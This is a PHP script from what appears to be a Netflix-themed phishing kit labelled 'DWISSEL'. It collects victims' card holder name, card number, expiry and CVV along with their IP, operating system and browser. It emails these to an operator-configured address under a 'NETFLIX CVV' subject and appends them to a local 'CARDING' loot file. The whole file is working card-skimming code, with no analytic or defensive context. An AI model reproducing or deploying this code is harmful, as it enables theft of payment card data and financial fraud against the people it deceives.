<?php
header('Access-Control-Allow-Origin: *');
session_start();
include("../../../../Email.php");
require "../os.php";
require "../geoplugin.php";
$DATE = date("d-m-Y h:i:sa");
$OS =getOS($_SERVER['HTTP_USER_AGENT']); 
$IP = $_SERVER["REMOTE_ADDR"];
@$_SESSION['_IP_'] = $_SERVER["REMOTE_ADDR"];
$UserAgent =$_SERVER['HTTP_USER_AGENT'];
$browser = explode(')',$UserAgent);				
$_SESSION['browser'] = $browserTy_Version =array_pop($browser); 
$_SESSION['cardnumber'] = $_POST['cardnumber'];
$_SESSION['cctype'] = $_POST['cctype'];
if( isset($_POST['cardholder'])  && isset($_POST['cardnumber']) && isset($_POST['expiration']) && isset($_POST['cvv'])){
	
        $msg = "

<div style='background: -webkit-linear-gradient(#E9E9E9, #B2B2B2 21px, #6A6A6A 1px, #000, #000 23px);margin: 3em auto;border-radius: 5px;box-shadow: inset 0 1px 0 rgba(255, 255, 255, 0.6), 0 22px 70px 4px rgba(0, 0, 0, 0.56), 0 0 0 1px rgba(0, 0, 0, 0.3);padding: 3px 5px;text-align: left;width:50em;font-size: 13px;'><center><span style='font: normal normal 13px/20px&#39;Lucida Sans Unicode&#39;;text-align:center;z-index: 2;position:relative;top: -0.18em;text-shadow: 0px 1px 0px rgba(255, 255, 255, 0.6);color: #444;'>DWISSEL</span></center>
	

	
<pre style ='position: relative;color: #DDD;padding:5 -5px;font-family:Verdana;line-height: 1.2em;margin:1.7em auto;max-height:1800px;overflow-x:hidden;'>
		           

                             <span style='position:relative;top:-20px;padding:10px;border:1px dashed blue;border-radius: 8px;'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;♣ CARDING ♣&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span>		
 

 
        <span style='color: #55FF55;'>$ CardHolderName~:</span>  ".$_POST['cardholder']."

        <span style='color: #55FF55;'>$ Cardnumber~:</span>  <span style='color: #EE82EE'>".$_POST['cctype']."</span>  ".$_POST['cardnumber']."

        <span style='color: #55FF55;'>$ Expiration~:</span>  ".$_POST['expiration']."

        <span style='color: #55FF55;'>$ CVV~:</span>  ".$_POST['cvv']."
		
		
				
                             <span style='position:relative;top:-20px;padding:10px;border:1px dashed blue;border-radius: 8px;'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;♣ MORE INFO ♣&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span>				

	
	
        <span style='color: #55FF55;'>$ IP~:</span>  <span style='color:#00FFFF'>".$IP."</span>	
	
        <span style='color: #55FF55;'>$ Operating System~:</span>  <span style='color:#00FFFF'>".$OS."</span>
		
        <span style='color: #55FF55;'>$ Browser~:</span>  <span style='color:#00FFFF'>".$browserTy_Version."</span>
		
        <span style='color: #55FF55;'>$ Date~:</span>  <span style='color:#00FFFF'>".$DATE."</span>
		
		
	

        <span style='color: #55FF55;'>>_</span> exit;

	</pre>
</div>


";
$subject = "".$_SESSION['cardnumber']." ".$_SESSION['cctype']." ♣NETFLIX CVV♣ ".$_SESSION['CountryName']."";
$headers = "From: Dwissel <cvv@dwissel.tn>\r\n";
$headers .= "MIME-Version: 1.0\r\n";
$headers .= "Content-Type: text/html; charset=ISO-8859-1\r\n";
@mail($email,$subject,$msg,$headers);
     } 
	 
$localrez ="###################################################
###################################################
=-=-=-=-=-=-=-=-=-=- ♣ CARDING ♣ =-=-=-=-=-=-=-=-=-		

CardHolderName: ".$_POST['cardholder']."
Cardnumber: ".$_POST['cctype']." ".$_POST['cardnumber']."
Expiration: ".$_POST['expiration']."
CVV: ".$_POST['cvv']."

=-=-=-=-=-=-=-=-=-=- ♣ MORE INFO ♣ =-=-=-=-=-=-=-=-	

IP: ".$IP."
Operating System: ".$OS."
Browser: ".$browserTy_Version."
Date: ".$DATE."

=-=-=-=-=-=-=-=-=-=- ♣ DWISSEL ♣ =-=-=-=-=-=-=-=-=-
";
	
$localr3z = fopen("../../../../REZLT/CARDING.txt","a");
	fwrite($localr3z,$localrez);
        fclose($localr3z); 
?>